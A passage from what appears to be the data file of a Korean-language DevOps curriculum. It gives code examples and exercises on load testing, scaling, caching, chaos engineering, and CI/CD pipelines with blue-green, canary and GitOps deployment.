  thresholds: {
    http_req_duration: ['p(95)<1000', 'p(99)<2000'],
    http_req_failed: ['rate<0.05'],
    checks: ['rate>0.95'], // 95% 이상 성공
  },
};

export default function () {
  group('사용자 여정', function () {
    // 1. 홈 페이지 방문
    let res = http.get('https://your-app.com/');
    check(res, { '홈 로딩 성공': (r) => r.status === 200 });
    sleep(2);

    // 2. 상품 목록 조회
    res = http.get('https://your-app.com/api/products');
    check(res, {
      '상품 목록 성공': (r) => r.status === 200,
      '상품 10개 이상': (r) => JSON.parse(r.body).length >= 10,
    });
    sleep(3);

    // 3. 상품 상세 조회 (무작위)
    const productId = Math.floor(Math.random() * 100) + 1;
    res = http.get(\`https://your-app.com/api/products/\${productId}\`);
    check(res, { '상세 조회 성공': (r) => r.status === 200 });
    sleep(5);

    // 4. 장바구니 추가 (10%만 실행)
    if (Math.random() < 0.1) {
      res = http.post('https://your-app.com/api/cart', JSON.stringify({
        productId: productId,
        quantity: 1
      }), {
        headers: { 'Content-Type': 'application/json' }
      });
      check(res, { '장바구니 추가 성공': (r) => r.status === 201 });
    }

    sleep(1);
  });
}

// 실행 및 결과 분석
k6 run --out json=results.json load-test.js

// 결과:
     ✓ 홈 로딩 성공.............: 99.8%
     ✓ 상품 목록 성공...........: 98.5%
     ✓ 상품 10개 이상...........: 98.5%
     ✓ 상세 조회 성공...........: 95.2% ← 피크 때 실패율 증가
     ✓ 장바구니 추가 성공.......: 92.1% ← 가장 낮음

     http_req_duration..........: avg=680ms p(95)=1.2s p(99)=2.5s ← p99 초과!`},{heading:"2. CapRover에서 앱 스케일링",steps:[{label:"수동 스케일링",code:`# CapRover 대시보드
1. Apps 메뉴 → 앱 선택
2. "App Configs" 탭
3. "Instance Count" 섹션
   - 현재: 1
   - 변경: 3 (3개 인스턴스)
4. "Save & Update" 클릭

# 결과:
- 3개의 컨테이너가 실행됨
- CapRover가 자동으로 Load Balancing
- 트래픽이 3개에 분산됨

# 확인
docker ps | grep app-name
# app-name.1  (포트 32771)
# app-name.2  (포트 32772)
# app-name.3  (포트 32773)

# 부하 테스트 재실행
ab -n 1000 -c 200 https://your-app.com/
# 개선:
# Before: Requests/sec: 50, Time/req: 4000ms
# After:  Requests/sec: 140, Time/req: 1400ms (280% 향상!)`},{label:"Docker Compose로 스케일링",code:`# docker-compose.yml
version: '3.8'
services:
  app:
    image: myapp:latest
    deploy:
      replicas: 3 # 3개 인스턴스
      resources:
        limits:
          cpus: '1'
          memory: 512M
        reservations:
          cpus: '0.5'
          memory: 256M
    environment:
      NODE_ENV: production

  nginx:
    image: nginx:alpine
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf
    depends_on:
      - app

# nginx.conf (로드 밸런서)
upstream backend {
  server app:3000;
  # Docker Compose가 자동으로 3개 인스턴스에 분산
}

server {
  listen 80;
  location / {
    proxy_pass http://backend;
    proxy_set_header Host $host;
  }
}

# 실행
docker-compose up --scale app=3`}]},{heading:"3. 데이터베이스 병목 해결",code:`// 문제: DB 연결 수 부족
// Error: ER_TOO_MANY_CONNECTIONS

// 해결 1: Connection Pooling 최적화
const mysql = require('mysql2/promise');

const pool = mysql.createPool({
  host: 'localhost',
  user: 'root',
  password: 'password',
  database: 'mydb',
  waitForConnections: true,
  connectionLimit: 50, // 10 → 50으로 증가
  queueLimit: 0,
  enableKeepAlive: true,
  keepAliveInitialDelay: 10000
});

// 해결 2: Read Replica 사용
const masterPool = mysql.createPool({
  host: 'mysql-master.example.com',
  // ... (쓰기 전용)
});

const replicaPool = mysql.createPool({
  host: 'mysql-replica.example.com',
  // ... (읽기 전용)
});

app.get('/api/products', async (req, res) => {
  // 읽기는 Replica에서
  const [products] = await replicaPool.query('SELECT * FROM products');
  res.json(products);
});

app.post('/api/products', async (req, res) => {
  // 쓰기는 Master에서
  await masterPool.query('INSERT INTO products ...', [...]);
  res.json({ success: true });
});

// 해결 3: 쿼리 캐싱
const cache = new Map();

app.get('/api/products', async (req, res) => {
  const cacheKey = 'products:all';

  if (cache.has(cacheKey)) {
    return res.json(cache.get(cacheKey));
  }

  const [products] = await pool.query('SELECT * FROM products');
  cache.set(cacheKey, products);

  // 5분 후 캐시 삭제
  setTimeout(() => cache.delete(cacheKey), 5 * 60 * 1000);

  res.json(products);
});`},{heading:"4. CDN과 정적 파일 분리",code:`// 문제: 이미지/CSS/JS 요청이 서버 부하 증가

// 해결: Cloudflare CDN 사용
// 1. Cloudflare 계정 생성
// 2. 도메인 추가
// 3. 네임서버 변경

// 정적 파일 캐싱 규칙
// Cloudflare 대시보드 → Page Rules
// URL: *your-app.com/assets/*
// Settings:
//   - Cache Level: Cache Everything
//   - Edge Cache TTL: 1 month
//   - Browser Cache TTL: 1 year

// Express에서 정적 파일 분리
app.use('/assets', express.static('public', {
  maxAge: '1y',
  immutable: true,
  setHeaders: (res, path) => {
    res.set('Access-Control-Allow-Origin', '*');
  }
}));

// HTML에서 CDN URL 사용
<link rel="stylesheet" href="https://cdn.your-app.com/assets/style.css">
<img src="https://cdn.your-app.com/assets/logo.png">

// 효과:
// Before: 서버가 모든 요청 처리 (이미지/CSS/JS 포함)
// After: CDN이 정적 파일 처리 → 서버 부하 70% 감소`},{heading:"5. 자동 스케일링 (Auto Scaling) 개념",code:`// Kubernetes HPA (Horizontal Pod Autoscaler) 예시
// hpa.yaml
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: myapp-hpa
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: myapp
  minReplicas: 2
  maxReplicas: 10
  metrics:
  - type: Resource
    resource:
      name: cpu
      target:
        type: Utilization
        averageUtilization: 70 # CPU 70% 시 스케일 아웃

# 적용
kubectl apply -f hpa.yaml

# 동작 원리:
# 1. CPU 사용률이 70% 초과 → 파드 추가
# 2. CPU 사용률이 50% 미만 → 파드 감소
# 3. 최소 2개, 최대 10개 유지

# AWS ECS Auto Scaling 예시
aws application-autoscaling register-scalable-target \\
  --service-namespace ecs \\
  --scalable-dimension ecs:service:DesiredCount \\
  --resource-id service/my-cluster/my-service \\
  --min-capacity 2 \\
  --max-capacity 10

aws application-autoscaling put-scaling-policy \\
  --policy-name cpu-scaling \\
  --service-namespace ecs \\
  --scalable-dimension ecs:service:DesiredCount \\
  --resource-id service/my-cluster/my-service \\
  --policy-type TargetTrackingScaling \\
  --target-tracking-scaling-policy-configuration file://config.json

# config.json
{
  "TargetValue": 70.0,
  "PredefinedMetricSpecification": {
    "PredefinedMetricType": "ECSServiceAverageCPUUtilization"
  }
}`},{heading:"⚡ 중급 실습 과제",checklist:["k6로 실제 사용자 여정 시나리오 작성 후 15분간 부하 테스트","CapRover에서 앱 인스턴스를 1개 → 3개로 증가 후 성능 비교","MySQL Connection Pool 크기 조정 후 동시 접속 한계 재측정","Cloudflare CDN 연결 후 정적 파일 응답 시간 90% 이상 개선","CPU 70% 도달 시 자동 스케일링 규칙 설정 (CapRover 또는 K8s)"]}]},advanced:{title:"고급: 대규모 트래픽 대비 아키텍처 설계",sections:[{heading:"📚 학습 목표",content:"수백만 사용자를 처리할 수 있는 확장 가능한 아키텍처를 설계하고 구현할 수 있다."},{heading:"1. 분산 부하 테스트 (Distributed Load Testing)",code:`// k6 Cloud로 전 세계 다중 위치 테스트
k6 cloud run load-test.js

// 또는 Grafana k6 Cloud 설정
export const options = {
  cloud: {
    name: 'Global Load Test',
    projectID: 12345,
    distribution: {
      'amazon:us:ashburn': { loadZone: 'amazon:us:ashburn', percent: 40 },
      'amazon:ie:dublin': { loadZone: 'amazon:ie:dublin', percent: 30 },
      'amazon:jp:tokyo': { loadZone: 'amazon:jp:tokyo', percent: 30 },
    },
  },
  stages: [
    { duration: '5m', target: 10000 }, // 1만 명까지
  ],
};

// Locust로 분산 테스트 (Python)
# locustfile.py
from locust import HttpUser, task, between

class WebsiteUser(HttpUser):
    wait_time = between(1, 3)

    @task(3)
    def view_products(self):
        self.client.get("/api/products")

    @task(1)
    def view_product_detail(self):
        product_id = random.randint(1, 100)
        self.client.get(f"/api/products/{product_id}")

# Master 서버에서 실행
locust -f locustfile.py --master

# Worker 서버 3대에서 실행
locust -f locustfile.py --worker --master-host=<master-ip>

# 웹 UI에서 테스트 시작: http://localhost:8089
# 목표: 10만 명 동시 사용자`},{heading:"2. 멀티 리전 배포 아키텍처",code:`# AWS Global Accelerator + CloudFront
# architecture.yml
Resources:
  # 1. 멀티 리전 배포
  USEastApp:
    Type: AWS::ECS::Service
    Properties:
      Cluster: !Ref ECSCluster
      # us-east-1 리전

  EUWestApp:
    Type: AWS::ECS::Service
    Properties:
      Cluster: !Ref ECSCluster
      # eu-west-1 리전

  APNortheastApp:
    Type: AWS::ECS::Service
    Properties:
      Cluster: !Ref ECSCluster
      # ap-northeast-1 리전

  # 2. Global Accelerator (지연 시간 기반 라우팅)
  GlobalAccelerator:
    Type: AWS::GlobalAccelerator::Accelerator
    Properties:
      IpAddressType: IPV4

  # 3. CloudFront (정적 파일 + 동적 콘텐츠)
  CDN:
    Type: AWS::CloudFront::Distribution
    Properties:
      Origins:
        - DomainName: api.example.com
          OriginPath: /api
          CustomOriginConfig:
            OriginProtocolPolicy: https-only

# Geo-DNS with Route 53
resource "aws_route53_record" "www" {
  zone_id = aws_route53_zone.main.zone_id
  name    = "www"
  type    = "A"

  geolocation_routing_policy {
    continent = "NA" # 북미 → us-east-1
  }

  alias {
    name                   = aws_lb.us_east.dns_name
    zone_id                = aws_lb.us_east.zone_id
    evaluate_target_health = true
  }
}

# 효과:
# - 한국 사용자 → 서울 리전 (지연 50ms)
# - 미국 사용자 → 버지니아 리전 (지연 30ms)
# - 유럽 사용자 → 아일랜드 리전 (지연 40ms)`},{heading:"3. Database Sharding (샤딩)",content:"데이터를 여러 데이터베이스로 분산하여 처리량 향상:",code:`// 사용자 ID 기반 샤딩
const shards = [
  mysql.createPool({ host: 'db-shard-1.example.com' }), // shard 0
  mysql.createPool({ host: 'db-shard-2.example.com' }), // shard 1
  mysql.createPool({ host: 'db-shard-3.example.com' }), // shard 2
  mysql.createPool({ host: 'db-shard-4.example.com' }), // shard 3
];

function getShardForUser(userId) {
  return shards[userId % shards.length];
}

app.get('/api/users/:userId', async (req, res) => {
  const userId = parseInt(req.params.userId);
  const shard = getShardForUser(userId);

  const [users] = await shard.query(
    'SELECT * FROM users WHERE id = ?',
    [userId]
  );

  res.json(users[0]);
});

// 예시:
// userId = 1 → shard 1 (1 % 4 = 1)
// userId = 5 → shard 1 (5 % 4 = 1)
// userId = 8 → shard 0 (8 % 4 = 0)

// 샤드 간 조인 방지 (비정규화)
// Bad: 샤드 A의 users와 샤드 B의 orders 조인 불가
// Good: orders 테이블에 user_name 컬럼 추가 (중복 허용)

// 샤드 리밸런싱 (샤드 추가 시)
async function rebalanceShards(newShardCount) {
  // 1. 새 샤드 추가
  const newShards = [...shards];
  for (let i = shards.length; i < newShardCount; i++) {
    newShards.push(mysql.createPool({
      host: \`db-shard-\${i + 1}.example.com\`
    }));
  }

  // 2. 데이터 재배치 (점진적으로)
  // 일부 사용자를 새 샤드로 이동
}`},{heading:"4. 캐시 전략 고도화",code:`// 다층 캐싱 (Multi-tier Caching)
// L1: 애플리케이션 메모리 (빠름, 작음)
// L2: Redis (중간, 큼)
// L3: CDN (느림, 매우 큼)

const NodeCache = require('node-cache');
const Redis = require('ioredis');

const l1Cache = new NodeCache({ stdTTL: 60 }); // 1분
const l2Cache = new Redis();

app.get('/api/products/:id', async (req, res) => {
  const productId = req.params.id;

  // L1 캐시 확인
  let product = l1Cache.get(\`product:\${productId}\`);
  if (product) {
    return res.json({ product, source: 'L1-memory' });
  }

  // L2 캐시 확인
  product = await l2Cache.get(\`product:\${productId}\`);
  if (product) {
    l1Cache.set(\`product:\${productId}\`, JSON.parse(product));
    return res.json({ product: JSON.parse(product), source: 'L2-redis' });
  }

  // DB 조회
  [product] = await db.query('SELECT * FROM products WHERE id = ?', [productId]);

  // 캐시 저장
  l1Cache.set(\`product:\${productId}\`, product);
  await l2Cache.setex(\`product:\${productId}\`, 3600, JSON.stringify(product)); // 1시간

  res.json({ product, source: 'DB' });
});

// Cache Stampede 방지 (동시 캐시 미스)
const locks = new Map();

async function getProductWithLock(productId) {
  const lockKey = \`lock:product:\${productId}\`;

  // 잠금 확인
  if (locks.has(lockKey)) {
    // 다른 요청이 이미 DB 조회 중 → 대기
    await locks.get(lockKey);
    return l2Cache.get(\`product:\${productId}\`);
  }

  // 잠금 설정
  const promise = db.query('SELECT * FROM products WHERE id = ?', [productId])
    .then(async ([product]) => {
      await l2Cache.setex(\`product:\${productId}\`, 3600, JSON.stringify(product));
      locks.delete(lockKey);
      return product;
    });

  locks.set(lockKey, promise);
  return promise;
}`},{heading:"5. Circuit Breaker 패턴",content:"장애가 발생한 서비스로의 요청을 차단하여 연쇄 장애 방지:",code:`const CircuitBreaker = require('opossum');

// 외부 API 호출
async function callExternalAPI(data) {
  const response = await fetch('https://external-api.com/data', {
    method: 'POST',
    body: JSON.stringify(data),
    timeout: 3000
  });
  return response.json();
}

// Circuit Breaker 설정
const breaker = new CircuitBreaker(callExternalAPI, {
  timeout: 3000, // 3초 타임아웃
  errorThresholdPercentage: 50, // 50% 실패 시
  resetTimeout: 30000, // 30초 후 재시도
  volumeThreshold: 10 // 최소 10개 요청 필요
});

// 상태 모니터링
breaker.on('open', () => {
  console.log('Circuit breaker opened - stopping requests');
});

breaker.on('halfOpen', () => {
  console.log('Circuit breaker half-open - testing');
});

breaker.on('close', () => {
  console.log('Circuit breaker closed - normal operation');
});

// 사용
app.post('/api/process', async (req, res) => {
  try {
    const result = await breaker.fire(req.body);
    res.json(result);
  } catch (err) {
    if (err.message === 'Breaker is open') {
      // Fallback 응답
      res.json({
        error: 'Service temporarily unavailable',
        fallback: true
      });
    } else {
      res.status(500).json({ error: err.message });
    }
  }
});

// 동작:
// 1. 정상: 모든 요청 통과
// 2. 50% 실패: Circuit Open (모든 요청 차단)
// 3. 30초 후: Half-Open (테스트 요청 1개)
// 4. 성공: Circuit Close (정상화)
// 5. 실패: 다시 Open (30초 대기)`},{heading:"6. Chaos Engineering (카오스 엔지니어링)",code:`# Chaos Monkey (Netflix) - 무작위 서버 종료 시뮬레이션
# chaos.sh
#!/bin/bash

while true; do
  # 30% 확률로 랜덤 컨테이너 종료
  if [ $((RANDOM % 10)) -lt 3 ]; then
    CONTAINER=$(docker ps -q | shuf -n 1)
    echo "Killing container: $CONTAINER"
    docker kill $CONTAINER
  fi

  sleep 300 # 5분마다
done

# Litmus Chaos (Kubernetes)
# pod-delete-chaos.yaml
apiVersion: litmuschaos.io/v1alpha1
kind: ChaosEngine
metadata:
  name: pod-delete-chaos
spec:
  engineState: 'active'
  chaosServiceAccount: pod-delete-sa
  experiments:
  - name: pod-delete
    spec:
      components:
        env:
        - name: TOTAL_CHAOS_DURATION
          value: '60'
        - name: CHAOS_INTERVAL
          value: '10'
        - name: FORCE
          value: 'false'

# 적용
kubectl apply -f pod-delete-chaos.yaml

# 테스트 시나리오:
# 1. 피크 타임에 무작위 파드 삭제
# 2. 애플리케이션이 자동 복구되는지 확인
# 3. 사용자 경험에 영향이 없는지 모니터링

# 네트워크 지연 주입
tc qdisc add dev eth0 root netem delay 200ms 50ms
# 200ms ± 50ms 지연 추가

# 패킷 손실 주입
tc qdisc change dev eth0 root netem loss 10%
# 10% 패킷 손실`},{heading:"⚡ 고급 실습 과제",checklist:["k6 Cloud로 전 세계 3개 지역에서 동시 부하 테스트 (총 1만 사용자)","사용자 ID 기반 DB 샤딩 구현 후 처리량 3배 이상 향상 확인","다층 캐싱 (메모리 + Redis + CDN) 구현 후 캐시 히트율 90% 이상 달성","Circuit Breaker로 외부 API 장애 시 자동 차단 및 Fallback 응답","Chaos Monkey로 무작위 서버 종료 시뮬레이션 후 자동 복구 확인"]}]}}}]},{id:"tier4",name:"Tier 4: 고급 운영 기술",period:"진행형",color:"bg-blue-100 border-blue-300 text-blue-800",reason:"더 전문적이고 효율적인 운영을 위해",topics:[{id:"4-1",name:"CI/CD와 배포 자동화",goal:"안전하고 빠르게 배포할 수 있다",hours:15,keywords:["CI/CD","Git workflow","automated deployment"],tasks:["GitHub Actions 워크플로우 작성","자동 테스트 설정","Blue-Green 배포 구현"],content:{beginner:{title:"초급: CI/CD 개념과 GitHub Actions 기본",sections:[{heading:"📚 학습 목표",content:"CI/CD가 무엇인지 이해하고, GitHub Actions로 간단한 자동화 파이프라인을 만들 수 있다."},{heading:"1. CI/CD가 왜 필요한가?",content:"수동 배포의 문제점과 자동화의 이점을 이해합니다.",list:["수동 배포: 개발자가 서버 SSH 접속 → git pull → npm install → pm2 restart (10분 소요, 실수 가능)","자동 배포: git push만 하면 자동으로 테스트 → 빌드 → 배포 (2분 소요, 실수 없음)","빠른 피드백: 코드 푸시 후 5분 안에 배포 완료 또는 실패 알림","안정성: 테스트 실패 시 자동으로 배포 중단"]},{heading:"2. CI와 CD의 차이",code:`# CI (Continuous Integration) - 지속적 통합
- 개발자가 코드를 push할 때마다:
  1. 코드 린팅 (문법 체크)
  2. 유닛 테스트 실행
  3. 빌드 성공 확인
- 목표: 버그를 빠르게 발견

# CD (Continuous Deployment) - 지속적 배포
- CI가 성공하면:
  1. 빌드된 결과물을 서버에 배포
  2. 서비스 재시작
  3. 헬스 체크
- 목표: 사용자에게 빠르게 전달

# 전체 흐름:
git push → CI (테스트) → CD (배포) → 사용자에게 도달`},{heading:"3. GitHub Actions 첫 워크플로우",steps:[{label:"기본 구조",code:`# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'

      - name: Install dependencies
        run: npm ci

      - name: Run tests
        run: npm test

      - name: Build
        run: npm run build`},{label:"동작 확인",code:`# 1. 위 파일을 Git에 커밋
git add .github/workflows/ci.yml
git commit -m "Add CI workflow"
git push

# 2. GitHub 웹사이트에서 확인
# Repository → Actions 탭
# 워크플로우 실행 상태 확인

# 3. 결과:
✓ Checkout code (1s)
✓ Setup Node.js (3s)
✓ Install dependencies (15s)
✓ Run tests (5s)
✓ Build (8s)

Total: 32s`}]},{heading:"4. 자동 배포 추가",code:`# .github/workflows/deploy.yml
name: Deploy

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'

      - name: Install dependencies
        run: npm ci

      - name: Build
        run: npm run build

      - name: Deploy to server
        uses: appleboy/ssh-action@master
        with:
          host: \${{ secrets.SERVER_HOST }}
          username: \${{ secrets.SERVER_USER }}
          key: \${{ secrets.SSH_PRIVATE_KEY }}
          script: |
            cd /var/www/myapp
            git pull origin main
            npm install
            npm run build
            pm2 restart myapp

# GitHub Secrets 설정:
# Repository → Settings → Secrets and variables → Actions
# - SERVER_HOST: your-server-ip
# - SERVER_USER: root
# - SSH_PRIVATE_KEY: (복사한 SSH 키)`},{heading:"5. 실패 시 알림 받기",code:`# Slack 알림 추가
- name: Notify Slack on failure
  if: failure()
  uses: slackapi/slack-github-action@v1
  with:
    payload: |
      {
        "text": "❌ Deployment failed for \${{ github.repository }}",
        "blocks": [
          {
            "type": "section",
            "text": {
              "type": "mrkdwn",
              "text": "Commit: \${{ github.sha }}\\nAuthor: \${{ github.actor }}"
            }
          }
        ]
      }
  env:
    SLACK_WEBHOOK_URL: \${{ secrets.SLACK_WEBHOOK }}

# Slack Webhook 설정:
# 1. Slack에서 Incoming Webhooks 앱 추가
# 2. Webhook URL 복사
# 3. GitHub Secrets에 SLACK_WEBHOOK 추가`},{heading:"6. 환경별 배포 (Staging/Production)",code:`# .github/workflows/deploy-staging.yml
name: Deploy to Staging

on:
  push:
    branches: [develop]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      # ... (빌드 단계)
      - name: Deploy to Staging
        uses: appleboy/ssh-action@master
        with:
          host: \${{ secrets.STAGING_HOST }}
          script: |
            cd /var/www/myapp-staging
            git pull origin develop
            # ...

# .github/workflows/deploy-production.yml
name: Deploy to Production

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production # 수동 승인 필요
    steps:
      # ... (빌드 단계)
      - name: Deploy to Production
        uses: appleboy/ssh-action@master
        with:
          host: \${{ secrets.PROD_HOST }}
          script: |
            cd /var/www/myapp
            git pull origin main
            # ...

# 환경 보호 설정:
# Repository → Settings → Environments → New environment
# Name: production
# Required reviewers: (팀원 선택)
# → main 브랜치 push 시 수동 승인 후 배포`},{heading:"💡 초급 실습 과제",checklist:["GitHub Actions로 CI 워크플로우 작성 (테스트 + 빌드)","테스트 실패 시 워크플로우가 중단되는지 확인","자동 배포 워크플로우 추가하여 main 브랜치 push 시 서버 배포","Slack 알림 설정하여 배포 실패 시 알림 수신","Staging과 Production 환경 분리하여 각각 자동 배포"]}]},intermediate:{title:"중급: 고급 배포 전략과 롤백",sections:[{heading:"📚 학습 목표",content:"Blue-Green 배포, Canary 배포 등 고급 배포 전략을 이해하고 구현할 수 있다."},{heading:"1. Blue-Green 배포",content:"두 개의 동일한 환경을 준비하여 무중단 배포를 구현합니다.",code:`# docker-compose.yml
version: '3.8'
services:
  app-blue:
    image: myapp:blue
    container_name: app-blue
    ports:
      - "3001:3000"
    environment:
      - COLOR=blue

  app-green:
    image: myapp:green
    container_name: app-green
    ports:
      - "3002:3000"
    environment:
      - COLOR=green

  nginx:
    image: nginx:alpine
    ports:
      - "80:80"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf

# nginx.conf
upstream backend {
  server app-blue:3000;  # 현재 활성화된 환경
  # server app-green:3000;
}

server {
  listen 80;
  location / {
    proxy_pass http://backend;
  }
}

# 배포 스크립트
#!/bin/bash
# deploy-blue-green.sh

CURRENT=$(curl -s http://localhost/api/version | jq -r '.env')

if [ "$CURRENT" == "blue" ]; then
  # Green에 새 버전 배포
  docker-compose up -d app-green
  sleep 5  # 헬스 체크 대기

  # 헬스 체크
  if curl -f http://localhost:3002/health; then
    # Nginx 설정 변경 (blue → green)
    sed -i 's/app-blue/app-green/' nginx.conf
    docker-compose restart nginx

    echo "Switched to green"
    # Blue 환경 정리
    docker-compose stop app-blue
  else
    echo "Health check failed, rollback"
    docker-compose stop app-green
  fi
else
  # Blue에 새 버전 배포 (동일한 로직)
  # ...
fi`},{heading:"2. Canary 배포 (점진적 배포)",code:`# nginx.conf (가중치 기반 라우팅)
upstream backend {
  server app-v1:3000 weight=9;  # 90% 트래픽
  server app-v2:3000 weight=1;  # 10% 트래픽
}

# 단계별 증가
# Step 1: 10% → weight=1
# Step 2: 25% → weight=3
# Step 3: 50% → weight=5
# Step 4: 100% → weight=10 (v1 제거)

# GitHub Actions 워크플로우
name: Canary Deployment

on:
  workflow_dispatch:
    inputs:
      traffic_percentage:
        description: 'Traffic percentage for new version'
        required: true
        default: '10'

jobs:
  canary-deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy new version
        run: |
          ssh \${{ secrets.SERVER_USER }}@\${{ secrets.SERVER_HOST }} << 'EOF'
            docker-compose up -d app-v2

            # Nginx 가중치 변경
            WEIGHT=\${{ github.event.inputs.traffic_percentage }}
            OLD_WEIGHT=$((100 - WEIGHT))

            sed -i "s/weight=.* # v1/weight=$OLD_WEIGHT # v1/" nginx.conf
            sed -i "s/weight=.* # v2/weight=$WEIGHT # v2/" nginx.conf

            docker-compose restart nginx
          EOF

      - name: Monitor metrics
        run: |
          sleep 300  # 5분 모니터링

          ERROR_RATE=$(curl -s https://your-app.com/metrics | jq '.error_rate')

          if (( $(echo "$ERROR_RATE > 0.05" | bc -l) )); then
            echo "Error rate too high, rolling back"
            ssh ... << 'EOF'
              sed -i "s/weight=.* # v1/weight=100 # v1/" nginx.conf
              sed -i "s/weight=.* # v2/weight=0 # v2/" nginx.conf
              docker-compose restart nginx
            EOF
            exit 1
          fi`},{heading:"3. 자동 롤백 시스템",code:`# .github/workflows/deploy-with-rollback.yml
name: Deploy with Auto Rollback

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Get current version
        id: current
        run: |
          CURRENT=$(ssh \${{ secrets.SERVER_USER }}@\${{ secrets.SERVER_HOST }} 'cat /var/www/myapp/VERSION')
          echo "version=$CURRENT" >> $GITHUB_OUTPUT

      - name: Deploy new version
        run: |
          ssh \${{ secrets.SERVER_USER }}@\${{ secrets.SERVER_HOST }} << 'EOF'
            cd /var/www/myapp
            git pull origin main
            npm install
            npm run build
            echo "\${{ github.sha }}" > VERSION
            pm2 restart myapp
          EOF

      - name: Health check
        id: health
        run: |
          sleep 10
          for i in {1..5}; do
            if curl -f https://your-app.com/health; then
              echo "healthy=true" >> $GITHUB_OUTPUT
              exit 0
            fi
            sleep 5
          done
          echo "healthy=false" >> $GITHUB_OUTPUT

      - name: Rollback on failure
        if: steps.health.outputs.healthy != 'true'
        run: |
          echo "Health check failed, rolling back to \${{ steps.current.outputs.version }}"
          ssh \${{ secrets.SERVER_USER }}@\${{ secrets.SERVER_HOST }} << 'EOF'
            cd /var/www/myapp
            git checkout \${{ steps.current.outputs.version }}
            npm install
            npm run build
            pm2 restart myapp
          EOF

      - name: Notify
        if: always()
        uses: slackapi/slack-github-action@v1
        with:
          payload: |
            {
              "text": "\${{ job.status == 'success' && '✅' || '❌' }} Deployment \${{ job.status }}",
              "blocks": [
                {
                  "type": "section",
                  "text": {
                    "type": "mrkdwn",
                    "text": "Commit: \${{ github.sha }}\\nHealth: \${{ steps.health.outputs.healthy }}"
                  }
                }
              ]
            }
        env:
          SLACK_WEBHOOK_URL: \${{ secrets.SLACK_WEBHOOK }}`},{heading:"4. Docker 이미지 버전 관리",code:`# .github/workflows/build-and-push.yml
name: Build and Push Docker Image

on:
  push:
    branches: [main]
    tags:
      - 'v*'

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v2

      - name: Login to Docker Hub
        uses: docker/login-action@v2
        with:
          username: \${{ secrets.DOCKER_USERNAME }}
          password: \${{ secrets.DOCKER_PASSWORD }}

      - name: Extract metadata
        id: meta
        uses: docker/metadata-action@v4
        with:
          images: myusername/myapp
          tags: |
            type=ref,event=branch
            type=semver,pattern={{version}}
            type=sha

      - name: Build and push
        uses: docker/build-push-action@v4
        with:
          context: .
          push: true
          tags: \${{ steps.meta.outputs.tags }}
          labels: \${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

# 결과:
# main 브랜치 push → myapp:main
# v1.2.3 태그 → myapp:v1.2.3, myapp:1.2, myapp:1
# git sha abc123 → myapp:sha-abc123`},{heading:"5. 데이터베이스 마이그레이션 자동화",code:`# .github/workflows/deploy-with-migration.yml
- name: Run database migrations
  run: |
    ssh \${{ secrets.SERVER_USER }}@\${{ secrets.SERVER_HOST }} << 'EOF'
      cd /var/www/myapp

      # 백업 먼저
      mysqldump -u root -p$DB_PASSWORD mydb > backup_$(date +%Y%m%d_%H%M%S).sql

      # 마이그레이션 실행
      npm run migrate

      # 실패 시 롤백
      if [ $? -ne 0 ]; then
        echo "Migration failed, restoring backup"
        mysql -u root -p$DB_PASSWORD mydb < backup_*.sql
        exit 1
      fi
    EOF

# package.json
{
  "scripts": {
    "migrate": "npx sequelize-cli db:migrate",
    "migrate:undo": "npx sequelize-cli db:migrate:undo"
  }
}

# migrations/20240101000000-add-column.js
module.exports = {
  up: async (queryInterface, Sequelize) => {
    await queryInterface.addColumn('users', 'phone', {
      type: Sequelize.STRING,
      allowNull: true
    });
  },

  down: async (queryInterface, Sequelize) => {
    await queryInterface.removeColumn('users', 'phone');
  }
};`},{heading:"⚡ 중급 실습 과제",checklist:["Blue-Green 배포 구현 후 무중단 배포 성공 확인","Canary 배포로 10% → 50% → 100% 점진적 배포 실행","헬스 체크 실패 시 자동 롤백되는지 테스트","Docker 이미지에 Git SHA 태그 자동 추가하여 버전 추적","데이터베이스 마이그레이션 실패 시 자동으로 백업 복원"]}]},advanced:{title:"고급: GitOps와 멀티 클러스터 배포",sections:[{heading:"📚 학습 목표",content:"GitOps 방식으로 선언적 배포를 구현하고, Kubernetes에서 고급 배포 전략을 사용할 수 있다."},{heading:"1. ArgoCD로 GitOps 구현",code:`# Kubernetes 매니페스트를 Git으로 관리
# k8s/deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp
spec:
  replicas: 3
  selector:
    matchLabels:
      app: myapp
  template:
    metadata:
      labels:
        app: myapp
        version: v1.2.3
    spec:
      containers:
      - name: myapp
        image: myusername/myapp:v1.2.3
        ports:
        - containerPort: 3000

# ArgoCD Application 정의
# argocd/application.yaml
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: myapp
  namespace: argocd
spec:
  project: default
  source:
    repoURL: https://github.com/myuser/myapp-k8s
    targetRevision: main
    path: k8s
  destination:
    server: https://kubernetes.default.svc
    namespace: production
  syncPolicy:
    automated:
      prune: true
      selfHeal: true
    syncOptions:
    - CreateNamespace=true

# 배포 프로세스:
# 1. Git에 k8s/deployment.yaml 업데이트 (이미지 버전 변경)
# 2. ArgoCD가 자동으로 감지
# 3. Kubernetes 클러스터에 적용
# 4. 헬스 체크 후 완료

# 설치:
kubectl create namespace argocd
kubectl apply -n argocd -f https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml

# 접속:
